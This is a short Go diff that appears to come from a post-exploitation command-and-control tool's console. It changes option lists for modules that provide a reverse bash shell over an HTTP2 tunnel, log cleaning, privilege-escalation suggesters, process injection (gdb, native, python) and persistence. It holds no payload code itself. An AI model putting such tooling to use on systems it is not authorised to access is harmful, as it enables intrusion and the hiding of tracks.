@@ -26,7 +26,7 @@ var (
 
 	// ShellHelpInfo provide utilities like ps, kill, etc
 	ShellHelpInfo = map[string]string{
-		"help":  "Display this help",
+		HELP:    "Display this help",
 		"bash":  "A reverse bash shell from HTTP2 tunnel, press Ctrl-D to leave",
 		"#ps":   "List processes: `ps`",
 		"#kill": "Kill process: `kill <PID>`",
@@ -110,7 +110,7 @@ func UpdateOptions(modName string) (exist bool) {
 		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
 		// on/off
 		switchOpt := addIfNotFound("switch")
-		switchOpt.Vals = []string{"on", "off"}
+		switchOpt.Vals = []string{"on", "off", "reverse"}
 		switchOpt.Val = "on"
 
 	case modName == agent.ModCLEAN_LOG:
@@ -128,13 +128,18 @@ func UpdateOptions(modName string) (exist bool) {
 
 	case modName == agent.ModLPE_SUGGEST:
 		currentOpt = addIfNotFound("lpe_helper")
-		currentOpt.Vals = []string{"lpe_les", "lpe_upc"}
+		for name := range LPEHelpers {
+			currentOpt.Vals = append(currentOpt.Vals, name)
+		}
 		currentOpt.Val = "lpe_les"
 
 	case modName == agent.ModINJECTOR:
 		pidOpt := addIfNotFound("pid")
 		pidOpt.Vals = []string{"0"}
 		pidOpt.Val = "0"
+		methodOpt := addIfNotFound("method")
+		methodOpt.Vals = []string{"gdb", "native", "python"}
+		methodOpt.Val = "native"
 
 	case modName == agent.ModPERSISTENCE:
 		currentOpt = addIfNotFound("method")
